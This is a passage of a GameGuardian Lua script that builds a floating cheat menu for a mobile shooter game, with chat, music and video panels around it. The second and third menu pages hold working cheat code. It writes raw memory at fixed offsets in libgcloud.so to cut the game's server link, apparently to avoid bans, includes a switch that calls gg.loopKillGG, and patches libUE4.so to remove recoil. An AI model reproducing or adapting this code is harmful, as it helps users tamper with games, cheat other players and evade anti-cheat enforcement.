mainLayoutParams.x = tonumber(x) + (event:getRawX() - RawX)
mainLayoutParams.y = tonumber(y) + (event:getRawY() - RawY)
window:updateViewLayout(floatWindow, mainLayoutParams)
end
end
motion.onTouch = hanshu
control.onTouch = hanshu
exitt.onTouch = hanshu
for i = 1,#stab do
--_ENV["jm"..i].onTouch = hanshu
end
end

invoke(swib1,swib2)
jm1:setBackground(slcta)
gg.setVisible(false)
luajava.setFloatingWindowHide(true)

end
corbk = true
当前ui = 1
function 切换(x)
当前ui = x
luajava.runUiThread(function()
for i = 1,#stab do
_ENV["jm"..i]:setBackground(_ENV["jmb"..i])
_ENV["layout"..i]:setVisibility(View.GONE)
end
title:setText(stab[当前ui][2])
_ENV["layout"..当前ui]:setVisibility(View.VISIBLE)
_ENV["jm"..当前ui]:setBackground(slcta)
YoYoImpl:with("FadeIn"):duration(200):playOn(_ENV["layout"..当前ui])
end)
end
显示 = 0
beij = luajava.new(GradientDrawable)
beij:setCornerRadius(20)
beij:setGradientType(GradientDrawable.LINEAR_GRADIENT)
beij:setColors((大背景颜色))
beij:setStroke(16,大背景边框)--边框宽度和颜色

beij2 = luajava.loadlayout({
GradientDrawable,
color = "#001E1C27",
cornerRadius = 10
})


titlejb = luajava.new(GradientDrawable)
titlejb:setCornerRadius(20)
titlejb:setGradientType(GradientDrawable.LINEAR_GRADIENT)
titlejb:setColors((标题颜色))
if 标题边框开关~=0 then
titlejb:setStroke(13,标题边框颜色)--边框宽度和颜色
end
function getcolor(cl)
cl[1] = tonumber(math.ceil(cl[1]*2.6,0,5))

if cl[1] > 255 then cl[1] = "0xff" else
cl[1] = "0x"..string.format("%x",cl[1]) end
for i = 1,3 do
cl[i+1] = string.format("%x",cl[i+1])
if string.len(cl[i+1]) == 1 then cl[i+1] = "0"..cl[i+1] end
end
cl = cl[1]..cl[2]..cl[3]..cl[4]
return cl
end
function getrgb(cl)
if string.sub(cl,1,1) == "#" then cl = "0x"..string.sub(cl,2,-1) end
cl = {
tonumber(string.sub(cl,0,4)),tonumber("0x"..string.sub(cl,5,6)),tonumber("0x"..string.sub(cl,7,8))}
return cl
end
function 隐藏()
luajava.runUiThread(function()
--control:setBackground(luajava.getBitmapDrawable("/sdcard/Y内部/图片/arlogo"))
if tonumber(tostring(cebian:getVisibility())) == 8.0 then
chuangk:setVisibility(View.VISIBLE)
cebian:setVisibility(View.VISIBLE)
title:setVisibility(View.VISIBLE)
exitt:setVisibility(View.VISIBLE)
frme:setBackground(titlejb)
显示=1
mainLayoutParams.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL
window:updateViewLayout(floatWindow, mainLayoutParams)
YoYoImpl:with("SlideInDown"):duration(200):playOn(cebian)
_ENV["layout"..当前ui]:setVisibility(View.VISIBLE)
YoYoImpl:with("FadeIn"):duration(800):playOn(_ENV["layout"..当前ui])
floatWindow:setBackground(beij)
else
显示=0
luajava.runUiThread(function()mainLayoutParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE
window:updateViewLayout(floatWindow, mainLayoutParams)
end)
frme:setBackground(beij2)
--control:setBackground(luajava.getBitmapDrawable("/sdcard/Y内部/图片/arlogo"))
title:setVisibility(View.GONE)
exitt:setVisibility(View.GONE)
floatWindow:setBackground(beij2)
chuangk:setVisibility(View.GONE)
cebian:setVisibility(View.GONE)
_ENV["layout"..当前ui]:setVisibility(View.GONE)
end
end)
end
function guid()
seed = {
'e','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'
}
tb = {}
for i = 1,32 do
table.insert(tb,seed[math.random(1,16)])
end
sid = table.concat(tb)
return string.format('%s%s%s%s%s',
string.sub(sid,1,8),
string.sub(sid,10,12),
string.sub(sid,21,22))
..string.format('%s%s%s%s%s',
string.sub(sid,1,6),
string.sub(sid,21,25)
)
end

local cglib = require('cglib')
local windowManager = require('windowManager')

local function FpsView()
	local fps = 0
	local fpsView = cglib.createInterceptor(TextView, {'onDraw'}, function(thisObject, param, methodProxy)
		methodProxy:invokeSuper(thisObject, param)
		fps = fps + 1
		thisObject:postInvalidateDelayed(2)
	end, context)

	fpsView:setText('FPS')
	fpsView:setTextColor(0x660043FF)
	fpsView:setTextSize(18)

	local handler = cglib.createInterceptor(Handler, {'handleMessage'}, function(thisObject, param, methodProxy)
		methodProxy:invokeSuper(thisObject, param)

		local message = param[1]
		fpsView:setText(string.format('FPS:%d', message.what))

	end, Looper:getMainLooper())

	luajava.startThread(function()
		while true do
			local msg = Message:obtain()
			msg.what = fps
			fps = 0
			handler:sendMessage(msg)
			gg.sleep(1000)
		end
	end)

	return fpsView
end

local fpsViewManager = windowManager:bindView(FpsView())
fpsViewManager:show()
fpsViewManager:setMoveable(true)

gg.setVisible(false)
chazhi = {} chajv = {}
function changan.seek(name,bian,smin,smax,nows)
_ENV[bian] = nows
thum=getseekgra()
thum:setSize(60, 60)
smin = tonumber(smin) smax = tonumber(smax)
chajv[bian] = smax-smin
chazhi[bian] = 1-smin
if smin == nil then smin = 1 smax = 10 end
truesmin = 1
truesmax = truesmin+chajv[bian]
if not nows then nows = smin tnows = (smin-nows)
else
tnows = (nows-smin)+1
end
if _ENV[bian] == nil then _ENV[bian] = 1.0 end
if not name then name = "未设置" end
local names = name..guid()
rest = luajava.loadlayout({
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
{
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
background = getseekgra(),
{
TextView,
gravity = "top",
textColor=txtco,
text = name..":"..nows,
id = luajava.newId(names),
layout_width = '110dp',
layout_marginLeft = "5dp",
layout_marginRight = "0dp",
},
{
SeekBar,
layout_width = '100dp',
min = truesmin,
max = truesmax,
progress = tnows,
progressDrawable={getseekgra2()},
thumb=thum,
onSeekBarChange = {
onProgressChanged = function(SeekBar, var2, var3)
if not var3 then
return
end
local resultvar = tonumber(string.sub(var2,0,-3))-chazhi[bian]
luajava.runUiThread(function()
luajava.getIdValue(names):setText(name..":".. resultvar)
end)
_ENV[bian] = resultvar
end
}}
}})

return rest
end





function changan.switch(name,func1,func2)
local func = 开关(name,func1,func2)
if not name then name = "未设置" end
rest = luajava.loadlayout({
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
{
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
background = getseekgra(),
{
TextView,
gravity = "top",
text = name,
layout_width = '140dp',
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
},
{
Switch,
gravity = "top",
layout_width = 'match_parent',
layout_hight = "10dp",
--id=luajava.newId(tid),
switchMinWidth = "20dp",
onCheckedChange = function(Switch,var2,var3)
if var2 == true then var2 = "开" else var2 = "关" end
luajava.newThread(function() func() end):start()
end,

}}
})

return rest
end
function changan.edit(name)
_ENV[name] = name..guid()
if not name then name = "点击输入文字" end
rest = luajava.loadlayout({
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
{
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
background = getseekgra(),
{
EditText,
gravity = "top",
hint = name,
gravity = "center",
id = luajava.newId(_ENV[name]),
layout_width = 'fill',
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
}}
})

return rest
end
function changan.radio(radio)
firadio = {
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
padding = "10dp",
orientation = "vertical"
}
if type(radio[1]) == "string" or type(radio[1]) == "number" then
firadio[#firadio+1] = {
TextView,text = radio[1],
textColor=txtco
} end
radios = {
RadioGroup,background = getseekgra(),
layout_width = 'fill_parent',
}
for i = 2,#radio do
radios[#radios+1] = {
RadioButton,
layout_width = 'fill_parent',
text = radio[i][1],
textColor=txtco,
onClick = function() luajava.newThread(function() pcall(radio[i][2]) end):start() end,
}
end
firadio[#firadio+1] = radios
return luajava.loadlayout(firadio)
end

function changan.check(cklist)
rest = {
GridLayout,
layout_width = 'wrap_content',
layout_height = "wrap_content",
columnCount = '3',
gravity = "center"

}
for i = 1,#cklist do
local name = cklist[i][1]
local func1 = cklist[i][2]
local func2 = cklist[i][3]
local nid = cklist[i][4]
if not name then name = "未设置" end
nid = name..guid()
local func = 开关2(nid,func1,func2,nid)
rstt = luajava.loadlayout({
LinearLayout,
layout_width = 'wrap_content',
layout_height = "30dp",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "0dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
onClick = function() luajava.newThread(function() func() end):start() end,

{
ImageView,
id = luajava.newId(nid),
layout_width = '20dp',
layout_height = "20dp",
background = "/sdcard/Y内部/图片/check1",
}, {
TextView,
gravity = "top",
text = name,
textColor=txtco,
layout_width = 'wrap_content',
layout_height = 'wrap_content',
layout_marginLeft = "4dp",
layout_marginRight = "5dp",
}})
rest[#rest+1] = rstt
end
return luajava.loadlayout(rest)
end
function changan.button(txt,func)
if not txt then txt = "未设置" end
return luajava.loadlayout(
{
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "wrap_content", {
LinearLayout,
layout_width = "fill_parent",
gravity = "center_horizontal",
layout_marginRight = "10dp",
layout_marginLeft = "10dp",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
background = getSelector3(),
onClick = function() luajava.newThread(function() pcall(func) end):start() end,
{
TextView,
--id = luajava.newId(tid),
text = txt,
textColor=txtco,
textSize = "16sp",
layout_width = "wrap_content",
},
}})
end
function changan.text(txt,color,size)
if not txt then txt = "未设置文字" end
if not color then color = "#ffffff" end
if not size then size = "18sp" end
return luajava.loadlayout(
{
TextView,
text = txt,
textSize = size,
textColor = color,
layout_width = "wrap_content",
})
end
corb = true
function changan.setedit(name,txt)
txt = tostring(txt)
luajava.runUiThread(function()
luajava.getIdValue(_ENV[name]):setText(txt)
end)
end

function changan.getedit(name)
--gg.alert(edit)
edit = tostring(luajava.getIdValue(_ENV[name]):getText())
return edit
end
function 开关(name,func1,func2)
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
_ENV[name] = "开"
pcall(func1)
else
_ENV[name] = "关"
pcall(func2)
end

end
end
end
function 开关2(name,func1,func2,nid)
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
luajava.runUiThread(function()
luajava.getIdValue(nid):setBackground(luajava.getBitmapDrawable("/sdcard/Y内部/图片/check2"))
end)
_ENV[name] = "开"
func1()
else
luajava.runUiThread(function()
luajava.getIdValue(nid):setBackground(luajava.getBitmapDrawable("/sdcard/Y内部/图片/check1"))
end)
_ENV[name] = "关"
func2()
end

end
end
end
function deve(t)
luajava.newThread(function() gg.alert(tostring(t)) end):start()
end
changan.controlChange = function(control,colors)
luajava.runUiThread(function()
if type(colors) ~= "table" then
end
import "android.animation.ObjectAnimator"
import "android.animation.ArgbEvaluator"
import "android.animation.ValueAnimator"
import "android.graphics.Color"
colorAnim = ObjectAnimator:ofInt(control,"textColor", colors)
colorAnim:setDuration(7000)
colorAnim:setEvaluator(ArgbEvaluator())
colorAnim:setRepeatCount(ValueAnimator.INFINITE)
colorAnim:setRepeatMode(ValueAnimator.REVERSE)
colorAnim:start()
end)
end
changan.controlRotetion = function(control,time)
luajava.runUiThread(function()
import "android.view.animation.Animation"
import "android.animation.ObjectAnimator"
xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
0, 360
})
xuanzhuandonghua:setRepeatCount(0)
xuanzhuandonghua:setRepeatMode(Animation.REVERSE)
xuanzhuandonghua:setDuration(time)
xuanzhuandonghua:start()
end) end
xuanzhuandonghua = nil -- 全局变量用于保存动画对象

changan.controlRotation2 = function(control, time)
luajava.runUiThread(function()
import "android.view.animation.Animation"
import "android.animation.ObjectAnimator"
xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
0, 360
})
xuanzhuandonghua:setRepeatCount(0)
xuanzhuandonghua:setRepeatMode(Animation.RESTART)
xuanzhuandonghua:setDuration(time)
xuanzhuandonghua:start()
end)
end

-- 停止旋转动画
changan.stopRotation = function()
if xuanzhuandonghua then
xuanzhuandonghua:cancel()
end
end
changan.controlFlip = function(control,time)
luajava.runUiThread(function()
import "android.view.animation.Animation"
import "android.animation.ObjectAnimator"
xuanzhuandonghua1 = ObjectAnimator:ofFloat(control, "rotationY", {0, 360})
xuanzhuandonghua1:setRepeatCount(0)
xuanzhuandonghua1:setRepeatMode(Animation.REVERSE)
xuanzhuandonghua1:setDuration(time)
xuanzhuandonghua1:start()
end) end
function tuic()
gg.toast("脚本已退出")
window:removeView(floatWindow)
luajava.setFloatingWindowHide(false)
luajava.newThread(function() os.exit() end):start()
bloc("end")
end
zidong = luajava.newThread(function()
while true do
if zdbf then logvid = luajava.getIdView("video") logvid.start(logvid) end
gg.sleep(500)
end
end)
url = "http://api.yujn.cn/api/zzxjj.php"
bloc = luajava.getBlock()
local runnable = luajava.getRunnable(function()
vidd=luajava.loadlayout({
VideoView,
id = luajava.newId('video'),
videoPath = url,
layout_width = "fill_parent",
layout_height = "wrap_content",
})
bloc("end")
end)
local handler = luajava.getHandler()
handler:post(runnable)
bloc("join")
web6 = luajava.loadlayout({FrameLayout,
gravity="top|center_vertical",
{LinearLayout,
gravity="center",orientation="vertical",
vidd,changan.button("换一个",function()
zdbf=false
changan.controlFlip(web6,2500)
gg.sleep(500)
logvid = luajava.getIdView("video")
logvid:setVideoPath(url)
gg.sleep(2000)
zdbf=true
end),
},{LinearLayout,
gravity="center",
changan.switch("自动播放",
function()
zdbf = true
end,
function()
zdbf=false
end),
},

}
)
zdbf=false
zidong:start()
do
local path = "/sdcard/.游客信息.lua" --用户信息
local r = io.open(path, "r")
if r then
qltname = r:read("*a")
else
qltname = ".游客" .. math.random(1111111, 9999999)
io.open(path, "w"):write(qltname)
end
local path = "/sdcard/.用户头像.lua" --用户信息
local r = io.open(path, "r")
if r then
qlticon = r:read("*a")
else
qlticon = ""
io.open(path, "w"):write(qlticon)
end
end
httpip="http://23.224.85.69/"
httpip2="http://23.224.85.69/"

function getu(name)
fs=gg.makeRequest(httpip.."?name="..name.."&mode=get").content
if fs=="00" then return "获取失败" else return fs end
end
function uplo(name,txt)
fs=gg.makeRequest(httpip.."?txt="..txt.."&name="..name.."&mode=set").content
end
function uprec(name,txt)
txt=string.bin2hex(txt)
if string.len(txt)<=7000 then
uplo(name,txt)
else
uplo(name,string.sub(txt,1,7000))
for i=2,(string.len(txt)/7000)-1 do
fs=gg.makeRequest(httpip.."?txt="..string.sub(txt,(i-1)*7000,i*7000).."&name="..name.."&mode=set2").content
end
txt=string.sub(txt,math.floor(string.len(txt)/7000)*7000+1,-1)
fs=gg.makeRequest(httpip.."?txt="..txt.."&name="..name.."&mode=set2").content
end
end
function 修改名字(lttext)
if string.len(lttext) <= 0 then return 0 end
if string.len(lttext) >= 400 then
gg.toast(".用户名长度上限20字节") return 0
end
local path = "/sdcard/.游客信息.lua" --用户信息
qltname = lttext
io.open(path, "w"):write(qltname)
gg.alert("修改成功\n"..lttext)
end
function 修改头像(txt)
local path2 = "/sdcard/.用户头像2.lua"
if string.find(txt,"emulated/0") ~= nil or string.find(txt,"/sdcard") ~= nil then
gg.alert("暂不支持上传本地图片\n请使用QQ号或直链")
return 0
end
if tonumber(txt) ~= nil then txt = "http://q1.qlogo.cn/g?b=qq&nk="..txt.."&s=100" end
if string.find(txt,"http%%") ~= nil or string.find(txt,"https%%") ~= nil then
gg.alert("格式有误，请重新输入") return 0
end
txt = string.url(txt,"en")
qlticon = txt
io.open(path2, "w"):write(qlticon)
gg.alert("头像修改成功")
end
lastlttm = os.time()-3
function 发送聊天(lttext)
if os.time()-lastlttm <= 3 then
gg.alert("聊天冷却"..3 -(os.time()-lastlttm).."秒")
return 0
end
local server = "http://23.224.85.69/" --服务器地址
--local chat_log = gg.makeRequest(server .. "lts.php?hq=true").content
local uptime = gg.makeRequest(server .. "lts.php?updat=true").content
if uptime then
--io.open(path, "w"):write(GT[2])
if string.len(lttext) <= 0 then return 0 end
if string.len(lttext) >= 400 then
gg.toast("文字长度上限400字节")
else
changan.setedit("输入聊天内容","")
lastlttm = os.time()
lttext = string.gsub(lttext,"·","•")
lttext = string.gsub(lttext,"～","~")
lttext = string.gsub(lttext,"—","-")
lttext = string.gsub(lttext,"…","...")
if not qlticon or qlticon == "" or qlticon == "nil" then qlticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" qlticon=string.url(qlticon,"en") end
local p = gg.makeRequest(server .. "lts.php?lticon="..qlticon.."&nr=" .. lttext .. "&name=" .. qltname).content
if p ~= "发送成功" then
--gg.alert(qlticon.."\nerror -149: 消息发送失败")
else
gg.toast("发送成功")
end
end
else
gg.toast("请检查您的网络是否正常") return 0
end
shuaxinchat()
end
function FGUtilStringSplit(str,split_char)
local sub_str_tab = {}
while (true) do
local pos = string.find(str, split_char);
if (not pos) then
sub_str_tab[#sub_str_tab + 1] = str;
break
end
local sub_str = string.sub(str, 1, pos - 1).."…"
sub_str_tab[#sub_str_tab + 1] = sub_str;
str = string.sub(str, pos + 1, #str);
end

return sub_str_tab
end
nowtime = 0
localres = {}
function shuaxinchat()
local server = "http://23.224.85.69/" --服务器地址
local uptime = gg.makeRequest(server .. "time.txt").content
if uptime then
if tonumber(uptime) > nowtime then
local chat_log = gg.makeRequest(server .. "lts.php?hq=true").content
nowtime = tonumber(uptime)
newltres = {}
ltres = FGUtilStringSplit(chat_log,"…")
for i = 1,#ltres do
if string.find(ltres[i],"·") == nil or string.find(ltres[i],"～") == nil then else
newltres[#newltres+1] = {}
newltres[#newltres].ltname = ltres[i]:match("·(.-)—")
newltres[#newltres].lttext = ltres[i]:match("～(.-)…")
newltres[#newltres].lttime = ltres[i]:match("—(.-)～")
newltres[#newltres].lticon = ltres[i]:match("㊢(.-)·")
end
end
for i = 1,#newltres do
isnew = true
for j = 1,#localres do
if newltres[i].ltname == localres[j].ltname and newltres[i].lttime == localres[j].lttime and newltres[i].lttext == localres[j].lttext then
isnew = false
end
end
if isnew == true then
isnew = false
xuyaoshuaxin = true
localres[#localres+1] = newltres[i]
--gg.alert(tostring(localres[#localres]))
addchat(changan.chat(localres[#localres]))
end
end
--gg.alert(tostring(localres))
if xuyaoshuaxin == true and already == true then
gundong()
xuyaoshuaxin = false
end
end
else
gg.toast("请检查您的网络是否正常") return 0
end
end
function addchat(cha)
local function invoke2()
layoutm4:addView(cha)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
function gundong()
if already then
gg.sleep(100)
local function invoke2()
_ENV["layouts4"]:fullScroll(View.FOCUS_DOWN)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
end
function removechat(cha)
local function invoke2()
_ENV["layoutm4"]:removeView(cha)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
function changan.chat(ltlist)
ltname = ltlist.ltname
lticon = ltlist.lticon
lttext = ltlist.lttext
lttime = ltlist.lttime
if not lticon or lticon == "" or lticon == "nil" then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" end
bitmap = luajava.getBitmapDrawable(lticon)
if not bitmap then bitmap = luajava.getBitmapDrawable("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2") end
if not _ENV[lticon] then _ENV[lticon] = bitmap end
if not lttext or lttext == "" then lttext = "  " end
if string.find(lticon,"http%%") ~= nil then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" end
if string.find(lticon,"/sdcard") == nil and string.find(lticon,"emulated") == nil and string.find(lticon,"http:/") == nil and string.find(lticon,"https:/") == nil then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" end
if not lttext then lttext = "   " end

if string.find(lttext,"☔️音")==nil then
local ctbg=chatbg()
ltresult = luajava.loadlayout(
{
LinearLayout,
layout_width = "190dp",
layout_height = "wrap_content",
orientation = "horizontal",
{
LinearLayout,
layout_height = "50dp",
layout_width = "50dp",
background = _ENV[lticon],
},
{
LinearLayout,
layout_height = "wrap_content",
layout_width = "wrap_content",
layout_marginLeft = "10dp",
orientation = "vertical",
{
TextView,
text = ltname.."\n"..lttime,
textSize = "10sp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}, {
TextView,
text = lttext,
textSize = "15sp",
background = ctbg,
padding = "3dp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}
}})
else
local ctbg=chatbg2()
local playPath=lttext:match("☔️音(.-)☔️音")
ltresult = luajava.loadlayout(
{
LinearLayout,
layout_width = "190dp",
layout_height = "wrap_content",
orientation = "horizontal",
{
LinearLayout,
layout_height = "50dp",
layout_width = "50dp",
background = _ENV[lticon],
},
{
LinearLayout,
layout_height = "wrap_content",
layout_width = "wrap_content",
layout_marginLeft = "10dp",
orientation = "vertical",
{
TextView,
text = ltname.."\n"..lttime,
textSize = "10sp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}, {
TextView,
text = "[ 语音 ]ᵒ",
textSize = "15sp",
background = ctbg,
onClick=function()
playPath=playPath
luajava.newThread(
function()
if panduan("/sdcard/Y内部/音频/"..playPath)~=true then
file.download(tostring(httpip2..playPath),"/sdcard/Y内部/音频/"..playPath)
end
--gg.alert("/sdcard/Y内部/音频/"..playPath)
based=string.hex2bin(file.read("/sdcard/Y内部/音频/"..playPath))
--gg.alert(based)
file.write("/sdcard/Y内部/test.mpp",based)
gg.playMusic("/sdcard/Y内部/test.mpp")
end):start()
end,
padding = "3dp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}
}})
end



return ltresult
end
function chatbg()
local jb=luajava.loadlayout({
GradientDrawable,
color = "#aa2383FF",
cornerRadius = 18
})
return jb
end
function visi(tid,ttid)
local tview = luajava.getIdValue(tid)
local ttview = luajava.getIdValue(ttid)
if not tview then return 0 end
if tonumber(tostring(tview:getVisibility())) == 8.0 then
tview:setVisibility(View.VISIBLE)
ttview:setBackground(luajava.getBitmapDrawable("/sdcard/Y内部/图片/hsj"))
else
tview:setVisibility(View.GONE)
ttview:setBackground(luajava.getBitmapDrawable("/sdcard/Y内部/图片/sj"))
end
end
function changan.box(views)
local tid = "box"..guid()
local ttid = tid.."6"
firadio = {
LinearLayout,
layout_width = '210dp',
layout_height = "wrap_content",
layout_marginTop = "2dp",
layout_marginBottom = "2dp",
orientation = "vertical",
}
if type(views[1]) == "string" or type(views[1]) == "number" then
firadio[#firadio+1] = {
LinearLayout,
layout_width = 'fill_parent',
layout_height = "30dp",
gravity = "center_vertical",
layout_marginTop = "2dp",
layout_marginBottom = "4dp",
onClick = function() visi(tid,ttid) end,
background = getSelector3(),
{
ImageView,
layout_marginLeft = "10dp",
id = luajava.newId(ttid),
background = "/sdcard/Y内部/图片/sj",
layout_width = "20dp",
layout_height = "20dp",
layout_marginTop = "0dp",
},
{
TextView,text = views[1],
textSize = "16sp",
layout_marginLeft = "15dp",
layout_width = "100dp",
textColor = "#ffffff",
gravity = "left",
}} else
gg.alert("changan.box第一个参数必须是string") os.exit()
end
radios = {
LinearLayout,
layout_marginLeft = "0dp",
layout_marginRight = "0dp",
orientation = "vertical",
visibility = "gone",
id = luajava.newId(tid),
padding = "0dp",
layout_width = 'fill_parent',
}
for i = 2,#views do
radios[#radios+1] = views[i]
end
firadio[#firadio+1] = radios
return luajava.loadlayout(firadio)
end
function getLayoutParams2()
local prm = luajava.new(WindowManager.LayoutParams)

layoutParams1 = prm
if (Build.VERSION.SDK_INT >= 26) then -- 设置悬浮窗方式
layoutParams1.type = prm.TYPE_APPLICATION_OVERLAY
else
layoutParams1.type = prm.TYPE_PHONE
end
layoutParams1.format = PixelFormat.RGBA_8888 -- 设置背景
layoutParams1.flags = prm.FLAG_NOT_FOCUSABLE -- 焦点设置Finish
layoutParams1.gravity = Gravity.CENTER -- 重力设置
layoutParams1.width = prm.WRAP_CONTENT -- 布局宽度
layoutParams1.height = prm.WRAP_CONTENT -- 布局高度
return layoutParams1
end
end

---菜单配置区
标题颜色={0x0000FF,0x0000FF}

标题边框开关=1
--0关1开
标题边框颜色="0x660043FF"

大背景颜色={0x0000FF,0x0000FF}

大背景边框="0x660043FF"

button颜色={0x0000FF,0x0000FF}

侧边文字颜色="#00FF7F"

菜单小背景颜色={0x33000000,0x33000000}

菜单小背景边框="0x660043FF"

其他控件背景={0x0000FF,0x0000FF}

侧边按钮背景1="/sdcard/Y内部/图片/vslct1"

侧边按钮背景2="/sdcard/Y内部/图片/vslct2"


stab = {
{"公告","Y内部"},
{"防封","防封专区"},
{"功能","功能专区"},
{"聊天","在线聊天室"},----不能调到
{"音乐","音乐区域"},
{"视频","美女视频"},
{"退出","脚本设置"},

}
xfcpic="http://yibainb.asia/view.php/713007b03796ec51cfbbeb60f05a4ba2.webp"
--悬浮窗链接或路径
gg.toast(os.date("当前登录卡密时间为:\n%Y年%m月%d日%H时%M分%S秒"))
draw.text('Y内部频道@YNB6666 ', 100,100)draw.setColor('#00ffff')
draw.text('Y内部全防作者:伊百 ', 150,150)draw.setColor('#00ffff')
draw.text('Y内部全防代理:阿巴 北岛 阿烽 楠鑫 ', 200,200)draw.setColor('#00ffff')

ui_init()--ui初始化不要动
changan.menu(
{
{--第一页
changan.text("伊百科技工作室\n谢谢使用Y内部\n官方频道@YNB6666\n保持一种热爱\n奔赴下一趟山海","#FFFFFF","15sp"),	


changan.button("收起页面",隐藏),--只填function名字写法
changan.button("官网地址",--定义function写法
function()
qq.joinGroup("yibai.asia")
end),
changan.button("联系伊百",
function()
qq.join("2974564854")
end),


}, {--第二页
changan.button("⚠️选择游戏⚠️",gg.setProcessX),
changan.switch("LOGO全防",
function()

tst("LOGO开启成功!")
string.toMusic('LOGO开启成功')
					
					string.toMusic('LOGO开启成功')
				end),

changan.switch("大厅全防",
function()
					gg.loopKillGG()

tst("大厅开启成功!")
string.toMusic('大厅开启成功')
					string.toMusic('大厅防开启成功')
				end),   




changan.text("搭配区域"),
changan.switch("全局离线",
function()
										if gg.getRangesList("libgcloud.so")[1] then
											local t = {}
											t[1] = gg.getRangesList("libgcloud.so")[1]["start"] + 0x42B3D8; -- 数值地址:0x79FDF2C3D8
											gg.setValues({
												[1] = {
													address = t[1],
													flags = 4,
													value = 0,
												},
											})

										end
										string.toMusic("全局离线开启成功")
									end,
									function()
										if gg.getRangesList("libgcloud.so")[1] then
											local t = {}
											t[1] = gg.getRangesList("libgcloud.so")[1]["start"] + 0x42B3D8; -- 数值地址:0x79FDF2C3D8
											gg.setValues({
												[1] = {
													address = t[1],
													flags = 4,
													value = 62762945,
												},
											})

										end
										string.toMusic("全局离线关闭成功")
									end),


}, {--第三页
changan.button("⚠️选择游戏⚠️",gg.setProcessX),
changan.switch("无后座",
function()
so=gg.getRangesList('libUE4.so')[1].start--无后座
py=0x517CB58
setvalue(so+py,16,8.8411673e-21)
so=gg.getRangesList('libUE4.so')[1].start--无后座
py=0x517CC4C
setvalue(so+py,16,8.8411673e-21)
so=gg.getRangesList('libUE4.so')[1].start--无后座
py=0x517CCBC
setvalue(so+py,16,8.8411673e-21)
string.toMusic('午后开启成功')---语音	
end),
}, {
---设定4是聊天




}, {--第四页
changan.switch("搜索音乐",
function()
search = gg.prompt({
"输入要搜索的歌曲\n可加上歌手名字",
"设置显示数量(数字)",
},g.sel,{
"text",
})
if not search then return end
gg.saveVariable(search,g.config)
bei()
go1=search[1]
go3=search[2]
jg=start(go1,go3)
if jg.code == 200 then
fh=jg.content
fh=json(fh)
--print(fh)
Play(gqlb,idb)
else
function inspect()
gg.alert("访问网络异常，错误代码：\n\n"..jg.code)
end
if not pcall(inspect) then print("网络异常，请先连接上网络") os.exit() end
end
XGCK=-1
end,
function()
string.toMusic("关闭成功")
end),
changan.switch("关闭音乐",
function()

gg.playMusic("stop")
gg.playMusic("stop")
gg.playMusic("stop")
end,
function()
string.toMusic("关闭成功")
end),


changan.switch("魔怔",
function()
gg.playMusic("https://link.hhtjim.com/163/1959190717.mp3")

end,
function()
string.toMusic("关闭成功")
end),

changan.switch("伤感",
function()
gg.playMusic("https://link.hhtjim.com/163/1330348068.mp3")
end,
function()
string.toMusic("关闭成功")
end),

}, {
web6---视频 勿动





}, {--第六页

changan.text("\n\n\n","#FFFFFF","15sp"),
changan.button("退出脚本",tuic),
}
})






chattable = {
{
ltname = "Y内部机器人",
lticon = "http://yibainb.asia/view.php/556b67d1db660197cfb76cc70354af3a.png",
lttext = "欢迎加入Y内部聊天室.\n彼此嘲笑吧，拉闸仔",
lttime = "8:00-20:00"
},
}
tmp = {
changan.edit("请输入内容"),
changan.button("发送",function() 发送聊天(changan.getedit("请输入内容")) end),
changan.box({
"    聊天设置",
changan.edit("名称"),
changan.button("修改昵称",function() 修改名字(changan.getedit(".用户名")) end),
changan.text(""),
changan.edit("请输入链接或QQ"),
changan.button("修改头像",function() 修改头像(changan.getedit("请输入链接或QQ")) end),
}),
}
chatlayout = {}
for i = 1,#chattable do
chatlayout[#chatlayout+1] = changan.chat(chattable[i])
end
local function invoke2()
for i = 1,#chatlayout do
_ENV["layoutm4"]:addView(chatlayout[i])
end
for i = 1,#tmp do
_ENV["layoutg4"]:addView(tmp[i])
end
end
